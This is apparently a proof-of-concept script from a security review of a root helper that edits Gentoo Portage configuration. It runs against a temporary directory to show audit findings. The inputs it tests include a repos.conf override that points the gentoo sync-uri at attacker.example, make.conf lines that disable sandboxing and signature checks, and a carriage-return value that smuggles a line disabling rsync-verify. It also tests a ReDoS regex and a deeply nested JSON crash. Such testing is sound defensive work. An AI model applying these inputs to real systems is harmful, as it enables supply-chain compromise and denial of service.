"""Dowody do GS-01, GS-05, GS-06, GS-10 i GS-12 — wszystko na katalogu tymczasowym.

Ten skrypt niczego nie instaluje, nie woła pkexec ani sudo i nie dotyka /etc.
Działa dokładnie tak, jak tests/test_helper.py: importuje moduł helpera i podmienia
po imporcie stałą CONFIG_ROOT — czego zainstalowany program nie umie zrobić.

    python3 security-review/poc/poc_helper.py

Uwaga: część 2 (ReDoS) celowo zatrzymuje się na 28 znakach wejścia. Przy 40 znakach
ten sam wzorzec liczyłby się godzinami, co jest właśnie tym, co dowodzi tezy.
"""

from __future__ import annotations

import io
import json
import sys
import tempfile
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from gentstore.helper import gentstore_helper as helper  # noqa: E402

tmp = Path(tempfile.mkdtemp()).resolve()
root = tmp / "etc" / "portage"
(root / "repos.conf").mkdir(parents=True)
helper.CONFIG_ROOT = root
helper.BACKUP_PARENT = tmp / "etc"


def call(op: str, **fields) -> dict:
    out = io.StringIO()
    helper.main(io.StringIO(json.dumps({"op": op, **fields})), out)
    return json.loads(out.getvalue())


print("=== GS-01 · write_file sprawdza ścieżkę, nie treść ===")
payload = (
    "[gentoo]\n"
    "location = /var/db/repos/gentoo\n"
    "sync-type = git\n"
    "sync-uri = https://attacker.example/tree.git\n"
    "auto-sync = yes\n"
)
answer = call(
    "write_file",
    path=str(root / "repos.conf" / "zzz-override.conf"),
    content=payload,
    expect=None,
)
print("  odpowiedź helpera:", answer.get("code", "ok"), "-", answer.get("bytes"), "bajtów")

import configparser  # noqa: E402  — tak samo scala portage.repository.config.RepoConfigLoader

(root / "repos.conf" / "gentoo.conf").write_text(
    "[gentoo]\nlocation = /var/db/repos/gentoo\nsync-type = rsync\n"
    "sync-uri = rsync://rsync.gentoo.org/gentoo-portage\n",
    encoding="utf-8",
)
parser = configparser.ConfigParser()
parser.read(sorted(str(f) for f in (root / "repos.conf").iterdir()))
print("  sync-uri repozytorium gentoo po scaleniu:", parser["gentoo"]["sync-uri"])

print()
print("=== GS-06 · które wartości make.conf helper przyjmuje ===")
for line in (
    'FEATURES="-sandbox -usersandbox -network-sandbox -userpriv -ipc-sandbox"',
    'FEATURES="-strict -webrsync-gpg"',
    'MAKEOPTS="-j1 -f/home/janek/evil.mk"',
    'EMERGE_DEFAULT_OPTS="--root=/tmp/elsewhere"',
    'USE="x" # and a comment',
    'PORTAGE_BASHRC="/tmp/x"',
):
    try:
        helper._check_make_conf_line(line)
        print("  PRZYJĘTA :", line)
    except helper.HelperError as exc:
        print("  odrzucona:", line, "->", exc.code)

print()
print("=== GS-10 · \\r przechodzi, a _lines() traktuje go jak koniec linii ===")
package_use = root / "package.use"
package_use.write_text("media-video/mpv vulkan\n", encoding="utf-8")
smuggled = "app-x/y flag\rsys-apps/portage -rsync-verify"
print("  pierwsze append:", call("append_line", path=str(package_use), line=smuggled).get("code", "ok"))
print("  bajty w pliku  :", package_use.read_bytes())
print("  helper._lines():", helper._lines(package_use.read_bytes().decode()))
print(
    "  drugie append tej samej linii zmieniło plik?",
    call("append_line", path=str(package_use), line=smuggled).get("changed"),
    "(obietnica z Docs §4: identycznej linii nie duplikujemy)",
)

print()
print("=== GS-10b · replace_line przepisuje CR na LF w całym pliku ===")
make_conf = root / "make.conf"
make_conf.write_bytes(b'USE="X"\nCOMMENT_ONE\rCOMMENT_TWO\nMAKEOPTS="-j4"\n')
print("  przed:", make_conf.read_bytes())
call("replace_line", path=str(make_conf), line='USE="X wayland"', match=r"^\s*USE=")
print("  po   :", make_conf.read_bytes(), "  (Docs §4: reszta pliku bajt w bajt)")

print()
print("=== GS-12 · zagnieżdżony JSON łamie kontrakt „zawsze jedna odpowiedź JSON” ===")
out = io.StringIO()
try:
    helper.main(io.StringIO("[" * 200_000 + "]" * 200_000), out)
    print("  odpowiedź:", out.getvalue().strip()[:120])
except BaseException as exc:  # noqa: BLE001 — o to właśnie chodzi
    print("  NIEZŁAPANY", type(exc).__name__, "— brak jakiejkolwiek odpowiedzi JSON")

print()
print("=== GS-05 · wzorzec `match` to regex z żądania, uruchamiany jako root ===")
pattern = "^(a+)+$"
print(f"  wzorzec {pattern!r}: {len(pattern)} znaków, PATTERN_MAX = {helper.PATTERN_MAX}")
for length in (18, 20, 22, 24, 26, 28):
    package_use.write_text("a" * length + "b\n", encoding="utf-8")
    started = time.monotonic()
    call("replace_line", path=str(package_use), line="x/y flag", match=pattern)
    print(f"  {length:2d} znaków w pliku -> {time.monotonic() - started:6.2f} s")
print("  (podwojenie co dwa znaki; 60 znaków to praktycznie nieskończoność)")
